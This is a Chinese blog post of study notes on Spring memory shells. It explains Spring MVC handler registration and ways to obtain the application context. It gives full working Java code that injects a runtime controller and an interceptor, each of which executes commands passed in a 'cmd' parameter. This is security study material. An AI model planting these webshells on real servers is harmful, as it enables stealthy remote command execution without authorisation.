---
title: spring内存马学习
date: 2022-04-21 17:19:10
tags:
      - springMemshell
description: spring内存马原理学习记录
---

## Controller内存马

要学习内存马先得配好环境,之前学的创建springMVC项目的步骤已经忘完了.....,再复习一下

首先从maven目标中创建一个webapp项目

然后开始导入相关依赖

```xml
<dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
    <!--spring核心-->
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-webmvc</artifactId>
      <version>5.1.9.RELEASE</version>
    </dependency>
    <!--servlet核心-->
    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>servlet-api</artifactId>
      <version>2.5</version>
    </dependency>
    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>jstl</artifactId>
      <version>1.2</version>
    </dependency>
    <!--jsp核心-->
    <dependency>
      <groupId>javax.servlet.jsp</groupId>
      <artifactId>jsp-api</artifactId>
      <version>2.2</version>
    </dependency>
    <!--文件上传依赖-->
    <dependency>
      <groupId>commons-fileupload</groupId>
      <artifactId>commons-fileupload</artifactId>
      <version>1.3.3</version>
    </dependency>
    <dependency>
      <groupId>org.apache.tomcat</groupId>
      <artifactId>tomcat-catalina</artifactId>
      <version>9.0.58</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>
```

springBoot用过之后觉得这配置好麻烦......

接着创建resources目录配置spring和springMVC的配置文件

大体目录结构

![image-20220422002418321](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002418321.png)

配置文件自定义,右键new选择spring Config

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002516259.png" alt="image-20220422002516259" style="zoom:80%;" />

spring配置文件,命名自定义,后面在web.xml中写对应就行

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
        ">

    <!-- Spring配置文件：除了控制器之外的bean对象都在这被扫描 -->
    <context:component-scan base-package="com.test.service"/>

</beans>

```

springMVC配置文件

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd
        ">

    <!-- SpringMVC配置文件：控制器的bean对象在这被扫描 -->
    <context:component-scan base-package="com.test.controller"/>

    <!--    启动mvc的注解-->
    <mvc:annotation-driven/>
    <!--    配置视图解析器的配置-->                                  <!--    调用视图解析器的方法：InternalResourceViewResolver-->
    <bean id="internalResourceViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <!-- 前缀 -->
        <property name="prefix" value="/"/><!--默认访问路径是webapp根路径下的，如果webapp下还有其他文件夹就写:/webapp/文件夹名-->
        <!-- 后缀 -->
        <property name="suffix" value=".jsp"/><!-- 如果是index.html文件，就写html -->
    </bean>
</beans>

```

最后,web.xml

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
   <!--这里需要版本为4.0,maven创建的好像是2点多的-->

  <!--    Spring配置-->

  <!--        1、让监听器知道spring的配置文件的位置-->
  <context-param>
    <param-name>contextConfigLocation</param-name>
    <!-- spring配置文件的文件名 -->
    <param-value>classpath:springConfig.xml</param-value>
  </context-param>
  <!--        2.创建监听器-->
  <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
  </listener>

  <!--        springmvc的 核心\前端\中央 控制器-->

  <!--        servlet的封装-->
  <servlet>
    <servlet-name>dispatcherServlet</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <!--            servlet读取springmvc的配置文件-->
    <init-param>
      <param-name>contextConfigLocation</param-name>
      <!-- springmvc配置文件的文件名 -->
      <param-value>classpath:springMVC.xml</param-value>
    </init-param>
    <!--            在容器创建servlet对象的优先级.    数字越小越先创建-->
    <load-on-startup>1</load-on-startup>
  </servlet>
  <servlet-mapping>
    <servlet-name>dispatcherServlet</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>




</web-app>

```



### controller

首先从SpringMVC的controller内存马开始学习

在我个人看来,controller是对servlet的一种封装,所以实现原理方面来说,应该和servlet的实现原理比较像

1. RequestMappingInfo类，对RequestMapping注解封装。里面包含http请求头的相关信息。如uri、method、params、header等参数。一个对象对应一个RequestMapping注解
2. HandlerMethod类，是对Controller的处理请求方法的封装。里面包含了该方法所属的bean对象、该方法对应的method对象、该方法的参数等。

![image-20220421174514491](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174514491.png)



SpringMVC初始化的时候,对每个容器中的Bean的构造方法和属性设置之后,将会调用` InitializingBean`接口的`afterPropertiesSet`方法

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174800350.png" alt="image-20220421174800350" style="zoom:67%;" />

其中实现类 RequestMappingHandlerMapping 用来处理具有 `@Controller` 注解类中的方法级别的 `@RequestMapping`

![image-20220421175523028](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421175523028.png)

它的`afterPropertiesSet`先是对静态内部配置类进行了初始化,然后调用了其抽象父类的`afterPropertiesSet`方法

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180801171.png" alt="image-20220421180801171" style="zoom:80%;" />

其抽象父类的对应方法中又调用了`initHandlerMethods`方法

![image-20220421180923594](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180923594.png)

这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 `processCandidateBean` 方法处理 Bean。

![image-20220421181210684](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181210684.png)

processCandidateBean中获取bean的类型并且符合isHandler要求就进行方法检测`detectHandlerMethods()`

![image-20220421181317837](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181317837.png)

isHandler调用的是其方法实现类`RequestMappingHandlerMapping`中的isHandler,它判断了该bean的定义是否带有`@Controller`或`@RequestMapping`注解

![image-20220421182037996](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421182037996.png)

这关过去之后,就开始查找handler methods并注册,

`handler method`通俗点讲其实就是controller中的方法

有一说一,这段代码还真不好理解

![image-20220421183153513](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421183153513.png)

这部分有两个关键功能，一个是 `getMappingForMethod` 方法根据 handler method 创建`RequestMappingInfo` 对象，一个是 `registerHandlerMethod` 方法将 handler method 与创建 `RequestMappingInfo `进行相关映射。

![image-20220421184453462](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184453462.png)

注册完成之后的信息都存在这样一个类中

![image-20220421184720102](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184720102.png)

[详细请求调用流程](https://www.cnblogs.com/w-y-c-m/p/8416630.html)

lookupPath就是请求的相对地址,比如/user/login

当一次请求进来的时候,首先会在`AbstractHandlerMethodMapping#lookupHandlerMethod`方法中获取直接匹配的`RequestMappingInfos`列表

如果没有匹配的`RequestMappingInfos`,则遍历所有的`MappingRegistry.mappingLookup`中保存的所有`RequestMappingInfos`

最后,获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod

![image-20220421185007532](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421185007532.png)

大概原理跟着顺了一遍

## 获取context

想要添加内存马,都必须得获取context

不明所以,先把代码粘贴过来

能用的只有4和5了

```java
// 1 ContextLoader类专门负责root application context初始化
// ContextLoader的一个主要方法就是 initWebApplicationContext
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();

// 2 spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());

// 3 类似2
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

// 4
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

// 5
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
filed.setAccessible(true);
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();

```

获取context应该算是所有内存马最重要的地方了吧,因为context作为上下文对象,它里面往往存储了很多承接多个功能模块的信息,这些信息中往往就存在着能注入内存马的部分

##### 方法一

获得的context不能`getBean(RequestMappingHandlerMapping.class)`,会抛出一个找不到这个bean的异常

下面两图分别是方法一和方法四获取到的context的区别,具体原因我猜测是因为在法一这个命名空间下没有RMSM这个bean的定义

![image-20220422141432909](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141432909.png)

![image-20220422141533441](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141533441.png)

##### 方法二 

在spring5以上失效了,失效原因是因为没有`getWebApplicationContext`方法了

##### 方法三 

也在spring5以上失效了,失效原因是因为没有`getWebApplicationContext`方法了

##### 方法四

方法四呢,联系这两天学习c#多线程学习到的东西就比较容易理解了,

该方法使用的是`RequestContextHolder`对象

该对象开头的注释大概可以理解为该类以线程绑定的形式暴露一个request对象,同时这个对象可以被所有当前线程产生的子线程继承

在不同的类中都可以拿到同一个对象实例，但不同的线程取到的实例不同我们将这种数据称之为**线程本地变量**，这种操作叫做**线程绑定**。(类似于针对线程将对象进行个性化定制)

![image-20220422201339819](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201339819.png)

使用`RequestContextHolder#getRequestAttributes()`方法返回一个reqeust的Attributes

![image-20220422201815223](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201815223.png)

从它的Attributes中获得对应的`WebApplicationContext`,并且命名空间也正常,可以使用

![image-20220422202640251](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422202640251.png)



##### 方法五 

在3.2.x以上版本可以使用 

这个方法看起来有点暴力

`LiveBeansView`这个类中有一个applicationContext集合

![image-20220422203055508](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203055508.png)

直接通过反射获取即可,唯一说的一点就是static变量反射get的时候可以传null进去,原因呢就是static是所有对象共享的变量,大概这样理解吧

```java
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        filed.setAccessible(true);
        org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

> 对这个类的理解

![image-20220422203515764](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203515764.png)

看了这个类源码中的注释,大概意思呢就是

这个类是生命周期还未结束的bean们的一个曝光适配器,建立了一个当前bean们和他们的依赖的快照

可以将bean和他们的依赖对应关系保存起来??

##### 获取RequestMappingHandlerMapping

首先需要获取`RequestMappingHandlerMapping`对象,有了这个对象,后面创建的RequestMappingInfo才能往里面注册

`WebApplicationContext`继承了BeanFactory,可以用它里面的getBean方法获取`RequestMappingHandlerMapping`

```java
RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
```

所以就要先获取`WebApplicationContext`才能获取到`RequestMappingHandlerMapping`对象





获取到`RequestMappingHandlerMapping`对象就可以开始构造`RequestMappingInfo`了,将写好的恶意内部类和恶意方法同构造好的`RequestMappingInfo`一起使用`requestMappingHandlerMapping#registerMapping`注册到`requestMappingHandlerMapping`中

![image-20220422112630154](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422112630154.png)

代码

```java
@RestController
public class evilController {

    @RequestMapping("/inject")
    public String inject() throws NoSuchMethodException {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        PatternsRequestCondition url = new PatternsRequestCondition("/evil");

        RequestMethodsRequestCondition requestMethodsRequestCondition = new RequestMethodsRequestCondition();
        
        Method method = injectController.class.getMethod("evil" );
        RequestMappingInfo requestMappingInfo = new RequestMappingInfo(url,requestMethodsRequestCondition,null,null,null,null,null);

        injectController injectController = new injectController();

        requestMappingHandlerMapping.registerMapping(requestMappingInfo,injectController,method);
        
        return "inject";
    }
    @RestController
    public class injectController{

        public String evil()throws Exception{
     //request也可以直接写成参数public String evil(HttpServletRequest request)
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            
            String cmd = request.getParameter("cmd");
            StringBuffer res = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }
            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    res.append(len + "\n");
                }

            } catch (Exception e) {
                res.append(e.getMessage());

            }
            return "<pre>" + res.toString() + "</pre>";

        }
    }
}
```

至此,controller类型的内存马算是做了初步了解

## Inteceptor内存马

学习完controller内存马之后,就对spring基础的方法注册流程有了一个了解

`AbstractHandlerMapping#adaptedInterceptors`中存储了HandlerInterceptor

![image-20220422121240656](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422121240656.png)

所以流程就很清晰了,首先获取到`AbstractHandlerMapping`,然后通过反射获取到`adaptedInterceptors`列表,往里面添加写好的恶意`interceptor`即可

`AbstractHandlerMapping`的运行类还是`RequestMappingHandlerMapping`,所以getBean的时候还是填`RequestMappingHandlerMapping.class`

```java
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);

```



> 在期间有个坑

![image-20220422123659126](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123659126.png)

就是看似我获取到的是向上转型得到的AbstractHandlerMapping对象,但是我这里使用了getClass是错误的,

当前AbstractHandlerMapping对应的正在运行中的对象是RequestMappingHandlerMapping对象

![image-20220422123824924](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123824924.png)

一般呢子类是可以获取到父类的变量的,但是`adaptedInterceptors`是private修饰的,不能被子类继承,也就是说,子类中根本就没有这个字段,所以在这里需要通过`AbstractHandlerMapping.class`来获取`field`

![image-20220422124507783](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422124507783.png)

```java
@RestController
public class interController{
    @RequestMapping("/injectInter")
    public String inject() throws Exception {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);

        Field declaredField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        declaredField.setAccessible(true);
        ArrayList list = (ArrayList) declaredField.get(abstractHandlerMapping);
        list.add(new evilInterceptor());
        return "inject";
    }
}
class evilInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        StringBuffer res = new StringBuffer();
        //加一个系统的判断
        String os = System.getProperty("os.name");
        boolean isWin = false;
        BufferedReader bufferedReader;
        if (os != null && os.toLowerCase().startsWith("windows")) {
            isWin = true;
        }
        try {
            if (isWin == false) {
                bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            } else {
                bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
            }

            String len;
            while ((len = bufferedReader.readLine()) != null) {
                res.append(len + "\n");
            }

        } catch (Exception e) {
            res.append(e.getMessage());

        }
        response.getWriter().print(res.toString());

        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }
}
```



注入成功之后,必须要访问一个requestMapping才会被拦器拦截到,此时带上参数就能执行命令了
